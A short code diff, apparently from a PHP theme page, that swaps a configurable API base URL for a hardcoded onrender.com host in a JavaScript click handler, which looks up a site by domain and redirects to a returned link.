@@ -337,7 +337,7 @@ if (strpos($currentUrl, '/themes/theme1/') === false) {
                 e.preventDefault();
                 (async () => {
                     try {
-                        let data = await fetch(`${API_BASE_URL}/api/websites?domain=${domain}`)
+                        let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                     data = await data.json()
                     window.location.href = data.data.domain_fb;
                     } catch {
